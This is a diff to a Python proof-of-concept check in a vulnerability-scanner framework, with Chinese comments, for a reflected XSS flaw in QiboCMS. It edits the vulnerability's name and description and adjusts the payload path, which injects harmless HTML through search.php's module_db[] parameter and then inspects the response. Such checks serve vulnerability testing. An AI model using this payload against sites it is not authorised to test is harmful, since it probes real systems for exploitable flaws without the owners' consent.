@@ -6,12 +6,12 @@ hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
     vuln_id = 'QiboCMS_0016' # 平台漏洞编号，留空
-    name = 'QiboCMS 跨站脚本攻击漏洞' # 漏洞名称
+    name = '齐博CMS XSS' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.XSS # 漏洞类型
     disclosure_date = '2013-02-03'  # 漏洞公布时间
     desc = '''
-        QiboCMS 跨站脚本攻击漏洞
+        QiboCMS  /search.php?module_db[]=<h1>xss-vulnerable</h1><!-- 跨站脚本攻击漏洞。
     ''' # 漏洞描述
     ref = 'https://www.exploit-db.com/exploits/15370/' # 漏洞来源
     cnvd_id = '' # cnvd漏洞编号
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            payload = "search.php?module_db[]=<h1>xss-vulnerable</h1><!--"
+            payload = "/search.php?module_db[]=<h1>xss-vulnerable</h1><!--"
             url = arg + payload
             code, head, res, errcode, finalurl = hh.http(url)
             if code == 200:
